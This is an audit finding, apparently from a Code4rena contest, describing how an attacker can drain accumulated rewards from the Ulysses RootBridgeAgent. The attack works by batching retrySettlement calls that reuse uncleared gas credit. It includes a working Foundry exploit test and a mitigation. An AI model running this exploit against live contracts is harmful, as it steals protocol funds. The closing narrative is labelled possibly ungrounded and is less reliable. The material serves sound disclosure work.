---
id: 18574
severity: "High"
---

# An attacker can steal Accumulated Awards from `RootBridgeAgent` by abusing `retrySettlement`

## Description

These are records of tokens that are “bridged out” (transferred) through the `RootBridgeAgent` to a `BranchBridgeAgent`. By default, when a settlement is created it is “successful”, unless the execution on the Branch Chain fails and `anyFallback(...)` is called on the `RootBridgeAgent`, which will set the settlement status as “failed”.

An example way to create a settlement, will be to “bridge out” some of the assets from `BranchBridgeAgent` to `RootBridgeAgent` and embed extra data that represents another bridge operation from `RootBridgeAgent` to `BranchBridgeAgent`. This flow passes through the `MulticallRootRouter` and could be the same branch agent as the first one or different. At this point, a settlement will be created. Moreover, a settlement could fail, for example, because of insufficient `gasToBridgeOut` provided by the user. In that case, `anyFallback` is triggered on the `RootBridgeAgent`, failing the settlement. At this time, `retrySettlement()` becomes available to call for the particular settlement.

Let’s first examine closely the `retrySettlement()` function:
```solidity
function retrySettlement(uint32 _settlementNonce, uint128 _remoteExecutionGas) external payable {
        //Update User Gas available.
        if (initialGas == 0) {
            userFeeInfo.depositedGas = uint128(msg.value);
            userFeeInfo.gasToBridgeOut = _remoteExecutionGas;
        }
        //Clear Settlement with updated gas.
        _retrySettlement(_settlementNonce);
    }
```
If `initialGas == 0`, it is assumed that someone directly calls `retrySettlement(...)` and therefore has to deposit gas (`msg.value`). However, if `initialGas > 0`, it is assumed that `retrySettlement(...)` could be part of an `anyExecute(...)` call that contained instructions for the `MulticallRootRouter` to do the call through a `VirtualAccount`. Let’s assume the second scenario where `initialGas > 0` and examine the internal `_retrySettlement`:

First, we have the call to `_manageGasOut(...)`, where again if `initialGas > 0`, we assume that the `retrySettlement(...)` is within `anyExecute`; therefore, the `userFeeInfo` state is already set. From there, we perform a `_gasSwapOut(...)` with `userFeeInfo.gasToBridgeOut` where we swap the `gasToBridgeOut` amount of `wrappedNative` for gas tokens that are burned. Then, back in the internal `_retrySettlement(...)`, the new gas is recorded in the settlement record and the message is sent to a Branch Chain via `anyCall`.

The weakness here, is that after we retry a settlement with `userFeeInfo.gasToBridgeOut` we do not set `userFeeInfo.gasToBridgeOut = 0`. Which if we perform only 1 `retrySettlement(...)`, it is not exploitable; however, if we embed in a single `anyExecute(...)` in several `retrySettlement(...)` calls, it becomes obvious that we can pay 1 time for `gasToBridgeOut` on a Branch Chain and use it multiple times on the `RootChain` to fuel the many `retrySettlement(...)` calls.

The second feature that will be part of the attack, is that on a Branch Chain we get refunded for the excess of `gasToBridgeOut` that wasn’t used for execution on the Branch Chain.
```solidity
function _retrySettlement(uint32 _settlementNonce) internal returns (bool) {
        //Get Settlement
        Settlement memory settlement = getSettlement[_settlementNonce];

        //Check if Settlement hasn't been redeemed.
        if (settlement.owner == address(0)) return false;

        //abi encodePacked
        bytes memory newGas = abi.encodePacked(_manageGasOut(settlement.toChain));

        //overwrite last 16bytes of callData
        for (uint256 i = 0; i < newGas.length;) {
            settlement.callData[settlement.callData.length - 16 + i] = newGas[i];
            unchecked {
                ++i;
            }
        }

        Settlement storage settlementReference = getSettlement[_settlementNonce];

        //Update Gas To Bridge Out
        settlementReference.gasToBridgeOut = userFeeInfo.gasToBridgeOut;

        //Set Settlement Calldata to send to Branch Chain
        settlementReference.callData = settlement.callData;

        //Update Settlement Status
        settlementReference.status = SettlementStatus.Success;

        //Retry call with additional gas
        _performCall(settlement.callData, settlement.toChain);

        //Retry Success
        return true;
    }
```
An attacker will trigger some number of `callOutAndBridge(...)` invocations from a Branch Chain, with some assets and extra data that will call `callOutAndBridge(...)` on the Root Chain to transfer back these assets to the originating Branch Chain (or any other Branch Chain). However, the attacker will set minimum `depositedGas` to ensure execution on the Root Chain, but insufficient gas to complete remote execution on the Branch Chain; therefore, failing a number of settlements. The attacker will then follow with a `callOutAndBridge(...)` from a Branch Chain that contains extra data for the `MutlicallRouter` and for the `VirtualAccount` to call `retrySettlement(...)` for every “failed” settlement. Since we will have multiple `retrySettlement(...)` invocations inside a single `anyExecute`, at some point the `gasToBridgeOut` sent to each settlement will become `>` the deposited gas and we will be spending from the Root Branch reserves (accumulated rewards). The attacker will redeem their profit on the Branch Chain, since they get a gas refund. Therefore, there will also be a mismatch between `accumulatedRewards` and the native currency in `RootBridgeAgent`, causing `sweep()` to revert and any `accumulatedRewards` left will be bricked.

## Proof of Concept

_Note: An end-to-end coded PoC is at the end of the PoC section._

Copy the two functions `testGasIssue` and `_prepareDeposit` in `test/ulysses-omnichain/RootTest.t.sol` and place them in the `RootTest` contract after the setup.

Execute with `forge test --match-test testGasIssue -vv`.

Result: the attacker starts with `1000000000000000000` wei (1 ether) and has `1169999892307980000` wei (>1 ether) after the execution of the attack (the end number could be slightly different, depending on foundry version), which is a mismatch between `accumulatedRewards` and the amount of WETH in the contract.

_Note - there are console logs added from the developers in some of the mock contracts. Consider commenting them out for clarity of the output._
```solidity
function testGasIssue() public {
        testAddLocalTokenArbitrum();
        console2.log("---------------------------------------------------------");
        console2.log("-------------------- GAS ISSUE START---------------------");
        console2.log("---------------------------------------------------------");
        // Accumulate rewards in RootBridgeAgent
        address some_user = address(0xAAEE);
        hevm.deal(some_user, 1.5 ether);
        // Not a valid flag, MulticallRouter will return false, that's fine, we just want to credit some fees
        bytes memory empty_params = abi.encode(bytes1(0x00));
        hevm.prank(some_user);
        avaxMulticallBridgeAgent.callOut{value: 1.1 ether }(empty_params, 0);

        // Get the global(root) address for the avax H mock token
        address globalAddress = rootPort.getGlobalTokenFromLocal(avaxMockAssethToken, avaxChainId);

        // Attacker starts with 1 ether
        address attacker = address(0xEEAA);
        hevm.deal(attacker, 1 ether);
        
        // Mint 1 ether of the avax mock underlying token
        hevm.prank(address(avaxPort));
        
        MockERC20(address(avaxMockAssetToken)).mint(attacker, 1 ether);
        
        // Attacker approves the underlying token
        hevm.prank(attacker);
        MockERC20(address(avaxMockAssetToken)).approve(address(avaxPort), 1 ether);

        // Print out the amounts of WrappedNative & AccumulateAwards state 
        console2.log("RootBridge WrappedNative START",WETH9(arbitrumWrappedNativeToken).balanceOf(address(multicallBridgeAgent)));
        console2.log("RootBridge ACCUMULATED FEES START", multicallBridgeAgent.accumulatedFees());

        // Attacker's underlying avax mock token balance
        console2.log("Attacker underlying token balance avax", avaxMockAssetToken.balanceOf(attacker));

        // Prepare a single deposit with remote gas that will cause the remote exec from the root to branch to fail
        // We will have to mock this fail since we don't have the MultiChain contracts, but the provided 
        // Mock Anycall has anticipated for that

        DepositInput memory deposit = _prepareDeposit();
        uint128 remoteExecutionGas = 2_000_000_000;

        Multicall2.Call[] memory calls = new Multicall2.Call[](0);

        OutputParams memory outputParams = OutputParams(attacker, globalAddress, 500, 500);
        
        bytes memory params = abi.encodePacked(bytes1(0x02),abi.encode(calls, outputParams, avaxChainId));

        console2.log("ATTACKER ETHER BALANCE START", attacker.balance);

        // Toggle anyCall for 1 call (Bridge -> Root), this config won't do the 2nd anyCall
        // Root -> Bridge (this is how we mock BridgeAgent reverting due to insufficient remote gas)
        MockAnycall(localAnyCallAddress).toggleFallback(1);

        // execute
        hevm.prank(attacker);
        // in reality we need 0.00000002 (supply a bit more to make sure we don't fail execution on the root)
        avaxMulticallBridgeAgent.callOutSignedAndBridge{value: 0.00000005 ether }(params, deposit, remoteExecutionGas);

        // Switch to normal mode 
        MockAnycall(localAnyCallAddress).toggleFallback(0);
        // this will call anyFallback() on the Root and Fail the settlement
        MockAnycall(localAnyCallAddress).testFallback();
        
        // Repeat for 1 more settlement
        MockAnycall(localAnyCallAddress).toggleFallback(1);
        hevm.prank(attacker);
        avaxMulticallBridgeAgent.callOutSignedAndBridge{value: 0.00000005 ether}(params, deposit, remoteExecutionGas);
        
        MockAnycall(localAnyCallAddress).toggleFallback(0);
        MockAnycall(localAnyCallAddress).testFallback();
        
        // Print out the amounts of WrappedNative & AccumulateAwards state  after failing the settlements but before the attack 
        console2.log("RootBridge WrappedNative AFTER SETTLEMENTS FAILURE BUT BEFORE ATTACK",WETH9(arbitrumWrappedNativeToken).balanceOf(address(multicallBridgeAgent)));
        console2.log("RootBridge ACCUMULATED FEES AFTER SETTLEMENTS FAILURE BUT BEFORE ATTACK", multicallBridgeAgent.accumulatedFees());

        // Encode 2 calls to retrySettlement(), we can use 0 remoteGas arg since 
        // initialGas > 0 because we execute the calls as a part of an anyExecute()
        Multicall2.Call[] memory malicious_calls = new Multicall2.Call[](2);

        bytes4 selector = bytes4(keccak256("retrySettlement(uint32,uint128)"));

        malicious_calls[0] = Multicall2.Call({target: address(multicallBridgeAgent), callData:abi.encodeWithSelector(selector,1,0)});
        malicious_calls[1] = Multicall2.Call({target: address(multicallBridgeAgent), callData:abi.encodeWithSelector(selector,2,0)});
        // malicious_calls[2] = Multicall2.Call({target: address(multicallBridgeAgent), callData:abi.encodeWithSelector(selector,3,0)});
        
        outputParams = OutputParams(attacker, globalAddress, 500, 500);
        
        params = abi.encodePacked(bytes1(0x02),abi.encode(malicious_calls, outputParams, avaxChainId));

        // At this point root now has ~1.1 
        hevm.prank(attacker);
        avaxMulticallBridgeAgent.callOutSignedAndBridge{value: 0.1 ether}(params, deposit, 0.09 ether);
        
        // get attacker's virtual account address
        address vaccount = address(rootPort.getUserAccount(attacker));

        console2.log("ATTACKER underlying balance avax", avaxMockAssetToken.balanceOf(attacker));
        console2.log("ATTACKER global avax h token balance root", ERC20hTokenRoot(globalAddress).balanceOf(vaccount));

        console2.log("ATTACKER ETHER BALANCE END", attacker.balance);
        console2.log("RootBridge WrappedNative END",WETH9(arbitrumWrappedNativeToken).balanceOf(address(multicallBridgeAgent)));
        console2.log("RootBridge ACCUMULATED FEES END", multicallBridgeAgent.accumulatedFees());
        console2.log("---------------------------------------------------------");
        console2.log("-------------------- GAS ISSUE END ----------------------");
        console2.log("---------------------------------------------------------");

    }

    function _prepareDeposit() internal returns(DepositInput memory) {
        // hToken address
        address addr1 = avaxMockAssethToken;

        // underlying address
        address addr2 = address(avaxMockAssetToken);

        uint256 amount1 = 500;
        uint256 amount2 = 500;

        uint24 toChain = rootChainId;

        return DepositInput({
            hToken:addr1,
            token:addr2,
            amount:amount1,
            deposit:amount2,
            toChain:toChain
        });

    }
```

## Recommendation

It is hard to conclude a particular fix, but consider setting `userFeeInfo.gasToBridgeOut = 0` after `retrySettlement` as part of the mitigation.

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability resides in the RootBridgeAgent contract that manages cross‑chain settlements. When a settlement fails, the contract marks it as failed and exposes a retrySettlement function that can be called to re‑execute the settlement with additional gas. The implementation updates the userFeeInfo.gasToBridgeOut value when the retry is performed, but it never resets this field after the call. Consequently, if an attacker triggers several retrySettlement calls inside a single anyExecute transaction – a situation that occurs when initialGas is greater than zero and the retry is part of a multicall routed through a VirtualAccount – the same gas allowance can be reused for each settlement. The attacker first creates a number of settlements that deliberately fail by providing insufficient remote execution gas on the branch chain. Each failed settlement records a non‑zero gasToBridgeOut amount. The attacker then bundles multiple retrySettlement invocations in one anyExecute call, causing the contract to consume the same deposited gas repeatedly without clearing the stored amount. Because the branch chain refunds any unused gas, the attacker receives a net gas refund while the RootBridgeAgent’s internal accounting of accumulatedRewards is reduced by the amount of gas that was repeatedly consumed. This creates a mismatch between the accumulatedRewards counter and the actual native token balance held by the contract, causing the sweep function to revert and leaving any remaining rewards permanently locked (bricked). From a user’s perspective the contract appears to lose wrapped native tokens and accumulated fees; balances that should have increased after a bridge operation instead stay unchanged or drop to zero, and the protocol’s fee‑withdrawal mechanism stops working. The issue was uncovered during a Code4rena audit by constructing a proof‑of‑concept test that repeatedly called retrySettlement and observed the reward imbalance. The bug is subtle because the gas reset logic is hidden inside a low‑level internal function and the contract’s state variables are updated only in a narrow code path, making the problem easy to miss during casual review. The root cause is the failure to clear userFeeInfo.gasToBridgeOut after a settlement retry, allowing the same gas credit to be applied multiple times. The recommended mitigation is to reset this field to zero after each successful retry, thereby preventing the reuse of the same gas allocation and preserving the integrity of the accumulated rewards accounting.
